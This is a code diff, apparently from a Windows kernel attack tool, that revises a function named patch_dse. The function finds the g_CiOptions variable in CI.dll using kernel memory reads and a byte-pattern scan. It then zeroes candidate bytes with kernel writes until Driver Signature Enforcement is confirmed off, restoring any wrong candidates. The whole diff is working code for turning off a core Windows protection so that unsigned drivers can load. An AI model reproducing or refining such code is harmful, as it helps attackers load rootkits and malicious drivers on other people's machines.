@@ -1420,12 +1420,12 @@ static BOOL patch_dse(UINT64 *out_kva,UINT64 *out_orig) {
             kva = 0;
         }
         if (kva) {
-            /* Layer 2: DWORD read — g_CiOptions upper 3 bytes must be 0, low byte 0..0x3F.
-               Real values: 0x00 (off), 0x06 (DSE on), 0x08 (WinLoad), 0x0E, 0x16, 0x46 (UMCI).
-               Writable-section check (Layer 4) is the primary guard against code-section hits;
-               the value range rejects obviously invalid DWORDs (upper bytes non-zero, etc.). */
+            /* Layer 2: DWORD read — g_CiOptions upper 3 bytes must be 0.
+               Known low-byte values: 0x00 (off), 0x06 (DSE on), 0x08 (WinLoad),
+               0x0E, 0x16, 0x46 (UMCI/SAC — 0x46 > 0x3F so old 0x3F limit was too tight).
+               Writable-section check (Layer 4) is the primary guard against code-section hits. */
             UINT64 cur = 0;
-            if (!kread(kva, 4, &cur) || cur > 0x3F) {
+            if (!kread(kva, 4, &cur) || cur > 0xFF) {
                 logf("[!] precise: kva=0x%016llX DWORD=0x%08llX — out of range, discarding",
                      (unsigned long long)kva, (unsigned long long)cur);
                 kva = 0;
@@ -1455,45 +1455,57 @@ static BOOL patch_dse(UINT64 *out_kva,UINT64 *out_orig) {
         }
     }
 
-    /* Fallback: AOB scan — verify every candidate on all backends. */
+    /* Fallback: AOB scan — trial-write each candidate to confirm it is g_CiOptions.
+       Multiple CI.dll .data globals may be stable/writable/non-zero; the trial write
+       confirms the actual g_CiOptions by checking is_dse_disabled() after each write.
+       Wrong candidates are restored before moving to the next one. */
     if(!kva) {
         UINT64 cands[MAX_CAND]; ULONG n=scan_ci_options(ci_base,vsz,cands,MAX_CAND);
-        if(n) {
-            {
-                for(ULONG ci=0; ci<n && !kva; ci++) {
-                    /* Alignment + bounds guard first */
-                    if ((cands[ci] & 3) || cands[ci] < ci_base || cands[ci] >= ci_base+(UINT64)vsz) {
-                        logf("[*] AOB cand[%lu]=0x%016llX misaligned/oob — skip",
-                             (unsigned long long)ci,(unsigned long long)cands[ci]);
-                        continue;
-                    }
-                    /* DWORD verify: upper 3 bytes must be 0, byte must be 0x06 (enabled) */
-                    UINT64 cur=0;
-                    if(!kread(cands[ci],4,&cur) || cur > 0x3F || (cur & 0xFF) != 0x06) {
-                        logf("[*] AOB cand[%lu]=0x%016llX DWORD=0x%08llX — skip",
-                             (unsigned long long)ci,(unsigned long long)cands[ci],(unsigned long long)cur);
-                        continue;
-                    }
-                    /* Stability re-read */
-                    UINT64 cur2=0; Sleep(15);
-                    if(!kread(cands[ci],4,&cur2) || cur2 != cur) {
-                        logf("[*] AOB cand[%lu]=0x%016llX unstable — skip",
-                             (unsigned long long)ci,(unsigned long long)cands[ci]);
-                        continue;
-                    }
-                    /* Writable section re-check (scan_ci_options already filters, but
-                       validate here too so the final accepted KVA is always confirmed) */
-                    if (!ci_kva_is_writable(cands[ci], ci_base)) {
-                        logf("[*] AOB cand[%lu]=0x%016llX not writable — skip",
-                             (unsigned long long)ci,(unsigned long long)cands[ci]);
-                        continue;
-                    }
-                    kva=cands[ci];
-                    orig_val = cur & 0xFF;
-                    logf("[*] AOB cand[%lu]=0x%016llX DWORD=0x%02llX stable writable — verified",
-                         (unsigned long long)ci,(unsigned long long)kva,(unsigned long long)cur);
-                }
+        for(ULONG ci=0; ci<n; ci++) {
+            if ((cands[ci] & 3) || cands[ci] < ci_base || cands[ci] >= ci_base+(UINT64)vsz) {
+                logf("[*] AOB cand[%lu]=0x%016llX misaligned/oob — skip",
+                     (unsigned long long)ci,(unsigned long long)cands[ci]);
+                continue;
             }
+            /* Upper 3 bytes must be 0; low byte must be non-zero (DSE currently on).
+               Accept all known CI values: 0x06, 0x08, 0x0E, 0x16, 0x46 (UMCI/SAC). */
+            UINT64 cur=0;
+            if(!kread(cands[ci],4,&cur) || cur > 0xFF || (cur & 0xFF) == 0) {
+                logf("[*] AOB cand[%lu]=0x%016llX DWORD=0x%08llX — skip",
+                     (unsigned long long)ci,(unsigned long long)cands[ci],(unsigned long long)cur);
+                continue;
+            }
+            UINT64 cur2=0; Sleep(15);
+            if(!kread(cands[ci],4,&cur2) || cur2 != cur) {
+                logf("[*] AOB cand[%lu]=0x%016llX unstable — skip",
+                     (unsigned long long)ci,(unsigned long long)cands[ci]);
+                continue;
+            }
+            if (!ci_kva_is_writable(cands[ci], ci_base)) {
+                logf("[*] AOB cand[%lu]=0x%016llX not writable — skip",
+                     (unsigned long long)ci,(unsigned long long)cands[ci]);
+                continue;
+            }
+            /* Trial write: zero the byte, confirm DSE actually goes off, restore if not */
+            UINT64 saved = cur & 0xFF;
+            logf("[*] AOB cand[%lu]=0x%016llX DWORD=0x%02llX — trial write",
+                 (unsigned long long)ci,(unsigned long long)cands[ci],(unsigned long long)cur);
+            if (!kwrite(cands[ci], 0, 1)) {
+                logf("[*] AOB cand[%lu] kwrite failed — skip",(unsigned long long)ci);
+                continue;
+            }
+            Sleep(50);
+            if (is_dse_disabled()) {
+                kva = cands[ci];
+                orig_val = saved;
+                logf("[*] AOB cand[%lu]=0x%016llX CONFIRMED — is g_CiOptions (val was 0x%02llX)",
+                     (unsigned long long)ci,(unsigned long long)kva,(unsigned long long)saved);
+                break;
+            }
+            /* Not g_CiOptions — restore original byte and try next candidate */
+            logf("[*] AOB cand[%lu]=0x%016llX did not disable DSE — restoring 0x%02llX, trying next",
+                 (unsigned long long)ci,(unsigned long long)cands[ci],(unsigned long long)saved);
+            kwrite(cands[ci], saved, 1);
         }
     }
     if(!kva){logf("[!] Could not locate g_CiOptions.");return FALSE;}
